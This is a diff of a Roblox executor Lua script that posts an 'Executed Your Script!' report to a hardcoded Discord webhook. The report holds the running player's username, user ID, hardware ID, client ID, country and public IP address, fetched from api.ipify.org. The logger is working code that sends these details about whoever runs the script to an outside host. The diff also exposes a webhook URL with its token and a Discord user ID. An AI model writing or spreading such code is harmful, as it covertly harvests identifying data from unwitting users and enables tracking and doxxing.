@@ -1,3 +1,5 @@
+--// getgenv().HOOKURL = "https://discordapp.com/api/webhooks/1042447828242407494/RfSY8XrvdIuxTyyR5V1M-gQQzBfC3m24Phe-rvb86fJq7MZIgGbxXvWuBIZKkR8LEqOX"
+--// getgenv().ID = "<@612489304391811092>"
 --// Game Load
 if not game:IsLoaded() then game.Loaded:Wait() end
 --// LOCAL MAIN
@@ -75,48 +77,47 @@ local requestwebhook = syn.request({
         ["Content-Type"] = "application/json"
     },
     Body = game:GetService("HttpService"):JSONEncode({
+    ["content"] = ID,
     ["username"] = "BxB.xyz | Webhook",
-      ["avatar_url"] = "https://cdn.discordapp.com/attachments/1021789126388887593/1021789164003393577/Free_Sample_By_Wix_1.jpg",
-      ["content"] = ID,
-       ["embeds"] = {{
-           ["title"] = "**"..game.Players.LocalPlayer.Name.." | Executed Your Script!**" ,  
-           ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
+    ["avatar_url"] = "https://cdn.discordapp.com/attachments/1021789126388887593/1021789164003393577/Free_Sample_By_Wix_1.jpg",
+    ["embeds"] = {{
+           ["title"] = "**                                   Someone | Executed Your Script!**" ,  
            ["description"] = "",
            ["color"] = 65484,
             ["fields"] = {{
-                ["name"] = "[ 📅 ] Executed Time Date [ 📅 ]",
+                ["name"] = " [ 📅 ] Executed Date [ 📅 ]",
                ["value"] = "```"..dt:FormatLocalTime("LL", "en-us").."```",
                 ["inline"] = OP
             },
 			{
-                ["name"] = "[ 🕒 ] Executed Time Clock [ 🕒 ]",
+                ["name"] = "[ 🕒 ] Executed Time [ 🕒 ] ",
                 ["value"] = "```"..os.date("%H")..":"..os.date("%M")..":"..os.date("%S").."```",
                 ["inline"] = OP
             },
 				                
 			{
                 ["name"] = "[ 👨‍🎓 ] INFO PLAYER [ 👨‍🎓 ]",
-                ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```"Players in Server : "..game.Players.NumPlayers .. "/"..game.Players.MaxPlayers"```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```Profile : ".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
+                ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```Profile : ".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
                 ["inline"] = CL
             }, 
-            {
+            { 
                 ["name"] = "[ 🎮 ] INFO GAME [ 🎮 ]",
                 ["value"] = "```Place Name  : "..info.Name.."```".."```Place ID : "..game.PlaceId.."```".."```Place Version : "..game.PlaceVersion.."```".."```PrivateServer ID : "..game.JobId.."```",
                 ["inline"] = CL
             }, 
             {
-                ["name"] = "[ 👨🏽‍💻 ] INFO EXECUTOR[ 👨🏽‍💻 ]",
+                ["name"] = "[ 👨🏽‍💻 ] INFO EXECUTOR [ 👨🏽‍💻 ]",
                 ["value"] = "```Executor Name : "..EXE.."```".."```Hwid : "..a.."```".."```Client ID : "..ClientId.."```".."```Country : "..code.."```".."```Local ID : "..game.Players.LocalPlayer.LocaleId.."```",
                 ["inline"] = CL
             },
 	    {
-                ["name"] = "[ ⭐ ] Premium | INFO [ ⭐ ]",
+                ["name"] = " [ ⭐ ] Premium | INFO  [ ⭐ ]",
                 ["value"] = "```IP Address : "..game:HttpGet("https://api.ipify.org").."```",
                 ["inline"] = CL
             },
          {
-                ["name"] = "[ 🛠 ] CREDIT [ 🛠 ]",
-                ["value"] = "```Credit : B O O M#4134 \n         https://bxb-hub.github.io/Profile_Card/```",
+                ["name"] = " [ 🛠 ] CREDIT  [ 🛠 ]",
+                ["value"] = "```Credit : B O O M#4134 \n         https://bxb-hub.github.io/BxB_Site/```",
                 ["inline"] = CL
             },
             }
